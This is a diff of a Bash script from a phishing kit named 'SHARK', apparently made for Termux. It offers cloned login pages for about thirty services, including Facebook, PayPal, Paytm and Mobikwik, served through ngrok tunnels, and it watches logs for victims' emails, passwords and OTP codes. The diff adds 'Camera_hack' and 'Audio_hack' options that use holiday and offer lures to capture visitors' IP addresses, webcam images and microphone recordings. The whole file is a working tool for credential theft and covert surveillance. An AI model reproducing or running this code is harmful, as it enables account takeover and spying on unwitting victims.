@@ -5,8 +5,7 @@
 #             AUTHOR: ASHISH                 #
 #              SHARK ©2020                   #
 #     EMAIL: ashishsingh103020@gmail.com     #
-#           BEST PHISHING TOOLS              #
-#            CREDIT: Darksec                 #
+#           BEST PHISHING TOOLS              #              
 #       created by :- a s h i s h            #
 #                                            #
 ##############################################
@@ -86,6 +85,40 @@ tput cnorm
 else 
 exit
 fi
+
+#file_check Camera
+
+file_check() {
+if [ -d "/sdcard/Camera_hack" ]
+then
+echo
+else 
+mkdir /sdcard/Camera_hack
+fi
+}
+
+#file_check1 Audio 
+
+file_check1() {
+if [ -d "/sdcard/Audio_hack" ]
+then
+echo
+else 
+mkdir /sdcard/Audio_hack
+fi
+}
+
+#catch_ip camera
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+}
 
 #spin
 spin_shark () {
@@ -184,34 +217,39 @@ echo -e "\e[94m
        ╚█████╗ ███████║███████║██████╔╝█████═╝
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v 1.0\e[m "
+       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v 2.0\e[m "
 
 echo 
 echo -e $'\e[1;32m        =======================================           \e[0m'
-echo -e $'\e[1;93m           c r e a t e d  b y  a s h i s h                \e[0m '
+echo -e $'        \e[1;37;41m    c r e a t e d  b y  a s h i s h    \e[m '
 echo -e $'\e[1;32m        =======================================           \e[0m '
 echo 
 banner(){
-echo -e "\e[1;96m=============================================================\e[m "
+echo -e "\e[1;96m==================================================================\e[m "
 echo " "
-printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;32m Facebook\e[0m                \e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;32m Zomato\e[0m          \e[0m\n"                                                                                     
-printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;32m Pinterest\e[0m               \e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;32m PhonePay\e[0m        \e[0m\n"                                                                                                                    
-printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;32m Instagram\e[0m               \e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;32m Paypal\e[0m          \e[0m\n"                                                                                           
-printf "\e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;32m Uber Eats\e[0m               \e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;32m Telegram\e[0m        \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;32m OLA\e[0m                     \e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;32m Twitter\e[0m         \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;32m Google\e[0m                  \e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;32m Flipcart\e[0m        \e[0m\n"                                                                                          
-printf "\e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;32m Paytm\e[0m                   \e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;32m Wordpress\e[0m       \e[0m\n"                                                                                          
-printf "\e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;32m Netflix\e[0m                 \e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;32m Snapchat\e[0m        \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;32m Instagram-Followers\e[0m     \e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;32m Protonmail\e[0m      \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;32m Amazon\e[0m                  \e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;32m Stackoverflow\e[0m   \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;32m WhatsApp\e[0m                \e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;32m ebay\e[0m            \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;32m Linkedin\e[0m                \e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;32m Twitch\e[0m          \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;32m Hotstar\e[0m                 \e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;32m Ajio\e[0m            \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;32m Spotify\e[0m                 \e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;32m Cryptocurrency\e[0m  \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;32m Github\e[0m                  \e[1;31m[\e[0m\e[1;77m31\e[0m\e[1;31m]\e[0m\e[1;32m Mobikwik\e[0m        \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;32m IPFinder\e[0m                \e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;32m Exit\e[0m            \e[0m\n"    
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n" 
+echo
+printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;31m[\e[0m\e[1;92m14\e[0m\e[1;31m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;31m[\e[0m\e[1;92m25\e[0m\e[1;31m] \e[0m\e[1;37;40mProtonmail\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;31m[\e[0m\e[1;92m15\e[0m\e[1;31m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;31m[\e[0m\e[1;92m26\e[0m\e[1;31m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n" 
+echo
+printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;31m[\e[0m\e[1;92m16\e[0m\e[1;31m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;31m[\e[0m\e[1;92m27\e[0m\e[1;31m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n"  
+echo
+printf "\e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;31m[\e[0m\e[1;92m17\e[0m\e[1;31m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;31m[\e[0m\e[1;92m28\e[0m\e[1;31m] \e[0m\e[1;48;5;129mTwitch\e[0m\n"           
+echo
+printf "\e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;31m[\e[0m\e[1;92m18\e[0m\e[1;31m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;31m[\e[0m\e[1;92m29\e[0m\e[1;31m] \e[0m\e[1;48;5;236mAJIO\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;31m[\e[0m\e[1;92m19\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;31m[\e[0m\e[1;92m30\e[0m\e[1;31m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n"   
+echo
+printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n"
 echo " "
-echo -e "\e[1;96m=============================================================\e[m "
+echo -e "\e[1;96m==================================================================\e[m "
 }
 
 banner
@@ -278,7 +316,8 @@ ash() {
 			    echo 
 			    echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m=========================\e[92m"
 			    echo
-			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
+			    touch usernames.txt >> /dev/null 2>&1
+			    tail -f usernames.txt 
 	
                             break;
 			     
@@ -1218,45 +1257,13 @@ ash() {
 
                            break;
 			   
-	           elif [ $option = 30 ]
-	           then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd cryptocurrency/
-                           echo 
-			   connection
-                           ( sleep 5 ) &> /dev/null & spin_shark
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 1
-                           echo 
-                           (sleep 6) &> /dev/null & spin
-			   echo
-			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
-                           ( sleep 18 ) &> /dev/null & spinner
-                           echo 
-			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                       
-			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			   clear
-			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
-			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "email" -e "password"     
-
-                           break;
-                
-		  elif [ $option = 31 ]
+		  elif [ $option = 30 ]
 	          then               
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd mobikwik/
                            echo 
 			   connection
-                           ( sleep 5 ) &> /dev/null & spinner
+                           ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
                            echo 
@@ -1281,7 +1288,152 @@ ash() {
                            tail -f log.txt | grep -e "userId" -e "otp"     
 
                            break;
-			 
+			   
+		  elif [ $option = 31 ]
+	          then        
+		           
+		           cd /data/data/com.termux/files/usr/bin/phs
+			   cd Camera_hack
+			   file_check
+			   echo
+			   clear
+			   echo
+			   echo -e "\e[1;32m >>> \e[1;93mChoose Your Tempelates\e[m"
+			   echo
+			   echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Diwali \e[0m" 
+			   echo
+			   echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Freinship Dare\e[0m" 
+			   echo
+			   echo -e "\e[1;31m[\e[0m\e[1;77m 3 \e[0m\e[1;31m]\e[0m\e[1;32m Freindship Day \e[0m"
+			   echo
+			   echo -e "\e[1;31m[\e[0m\e[1;77m 4 \e[0m\e[1;31m]\e[0m\e[1;32m Happy New Year \e[0m" 
+			   echo
+			   echo -e "\e[1;31m[\e[0m\e[1;77m 5 \e[0m\e[1;31m]\e[0m\e[1;32m Jio Offer \e[0m"
+			   echo
+			   read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;93m Enter Your Choice : \e[0m' page
+			   if [ $page = 1 ]
+			   then 
+			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+                           sed 's+forwarding_link+'$link'+g' diwali.html > index2.html
+                           sed 's+forwarding_link+'$link'+g' template.php > index.php
+		           elif [ $page = 2 ]
+		           then 
+		           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+		           sed 's+forwarding_link+'$link'+g' freindship_dare.html > index2.html
+			   sed 's+forwarding_link+'$link'+g' template.php > index.php
+			   elif [ $page = 3 ]
+			   then 
+			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+			   sed 's+forwarding_link+'$link'+g' freinship_day.html > index2.html
+			   sed 's+forwarding_link+'$link'+g' template.php > index.php
+			   elif [ $page = 4 ]
+			   then 
+			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+			   sed 's+forwarding_link+'$link'+g' happy_new_year.html > index2.html
+			   sed 's+forwarding_link+'$link'+g' template.php > index.php
+			   elif [ $page = 5 ]
+			   then 
+			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+			   sed 's+forwarding_link+'$link'+g' jio_offer.html > index2.html
+			   sed 's+forwarding_link+'$link'+g' template.php > index.php
+			   fi
+			   echo
+			   connection
+                           ( sleep 5 ) &> /dev/null & spin_shark
+                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           sleep 1
+                           echo 
+                           (sleep 6) &> /dev/null & spin
+			   echo
+			   tput civis
+                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ( sleep 18 ) &> /dev/null & spinner
+                           echo 
+			   tput cnorm
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+			   ( sleep 6 ) &> /dev/null & spinner1
+		           ash
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
+			   clear
+			   shark_logo
+			   echo 
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
+			   echo 
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
+                           echo
+			   while [ true ]; do
+                           if [[ -e "ip.txt" ]]; then
+			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+			   echo
+			   catch_ip
+			   rm -rf ip.txt
+			   fi
+			   sleep 0.5
+		           if [[ -e "Log.log" ]]; then
+			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+			   rm -rf Log.log
+			   fi
+			   sleep 0.5
+			   mv cam* /sdcard/Camera_hack >> /dev/null 2>&1 
+			   done
+			   
+			   break;
+			   
+	           elif [ $option = 32 ]
+	           then 
+		            cd /data/data/com.termux/files/usr/bin/phs
+			    cd Audio_hack
+		            file_check1
+			    echo
+			    default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
+                            printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m https://youtube.com\e[0m\e[1;92m ): \e[0m" $default_redirect
+                            read redirect_link
+                            redirect_link="${redirect_link:-${default_redirect}}"
+			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+			    sed 's+forwarding_link+'$link'+g' template.php > index.php
+			    sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
+			    echo
+			    connection
+                            ( sleep 5 ) &> /dev/null & spin_shark
+                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                            sleep 1
+                            echo 
+                            (sleep 6) &> /dev/null & spin
+			    echo
+			     tput civis
+                            ./ngrok http 4444 > /dev/null 2>&1 &
+                            ( sleep 18 ) &> /dev/null & spinner
+                             echo 
+			    tput cnorm
+                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+			    ( sleep 6 ) &> /dev/null & spinner1
+		            ash
+			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
+			    clear
+			    shark_logo
+			    echo 
+			    echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
+			    echo 
+			    echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
+                            echo
+		            while [ true ]; do
+                            if [[ -e "ip.txt" ]]; then
+		 	    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+			    echo
+			    catch_ip
+			    rm -rf ip.txt
+			    fi
+			    sleep 0.5
+		            if [[ -e "Log.log" ]]; then
+			    printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio received!\e[0m\n"
+			    rm -rf Log.log
+			    fi
+			    sleep 0.5
+			    mv 20* /sdcard/Audio_hack >> /dev/null 2>&1 
+			    done
+			   
+		            break;
+			   
 	          elif [ $option = 99 ]
 	          then     
 		      echo
